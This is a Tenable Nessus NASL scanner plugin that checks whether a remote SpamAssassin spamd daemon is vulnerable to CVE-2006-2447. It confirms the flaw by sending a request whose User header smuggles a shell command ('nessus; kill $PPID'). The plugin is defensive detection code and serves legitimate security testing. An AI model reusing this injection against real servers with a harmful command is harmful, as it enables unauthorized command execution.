#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21673);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2447");
  script_bugtraq_id(18290);

  script_name(english:"SpamAssassin Arbitrary Command Execution Vulnerability");
  script_summary(english:"Checks for an command execution flaw in spamd");

  desc = "
Synopsis :

The remote server allows execution of arbitrary commands. 

Description :

The remote host is running spamd, a daemon belonging to SpamAssassin
and used to determine whether messages represent spam. 

The installed version of spamd on the remote host appears to allow an
unauthenticated user to execute arbitrary commands, subject to the
privileges of the user under which it operates. 

See also : 

http://spamassassin.apache.org/advisories/cve-2006-2447.txt

Solution :

Upgrade to SpamAssassin 3.0.6 / 3.1.3 or later. 

Risk factor :

Medium / CVSS Base Score : 5.5
(AV:R/AC:H/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("find_service2.nasl");
  script_require_ports("Services/spamd", 783);

  exit(0);
}


port = get_kb_item("Services/spamd");
if (!port) port = 783;
if (!get_port_state(port)) exit(0);


# A sample email.
msg = string(
  "From: nessus\n",
  "To: root\n",
  "Subject: Test\n",
  "Date: Wed, 07 Jun 2006 10:18:42 -0400\n",
  "\n",
  "A simple test of ", SCRIPT_NAME, ".\n"
);


# Make sure spamd works.
soc = open_sock_tcp(port);
if (soc)
{
  req = string(
    "PROCESS SPAMC/1.2\r\n",
    "Content-length: ", strlen(msg), "\r\n",
    "User: nessus\r\n",
    "\r\n",
    msg
  );
  send(socket:soc, data:req);
  res = recv(socket:soc, length:1024);
  close(soc);
}


# If it does...
if (res && egrep(pattern:"^SPAMD/[^ ]+ [0-9]+ EX_OK", string:res))
{
  # Make sure the version looks vulnerable, unless we're paranoid.
  if (
    report_paranoia < 2 &&
    "X-Spam-Checker-Version:" >< res &&
    !egrep(pattern:"^X-Spam-Checker-Version: SpamAssassin ([0-2]\.|3\.(0\.[0-5]|1\.[0-2]))", string:res)
  ) exit(0);

  # Now try to exploit the flaw to kill our connection.
  soc = open_sock_tcp(port);
  if (soc)
  {
    req = string(
      "PROCESS SPAMC/1.2\r\n",
      "Content-length: ", strlen(msg), "\r\n",
      "User: nessus; kill $PPID\r\n",
      "\r\n",
      msg
    );
    send(socket:soc, data:req);
    res2 = recv(socket:soc, length:1024);

    # There's a problem if we didn't receive anything this time.
    if (res2 == NULL) security_warning(port);
  }
}
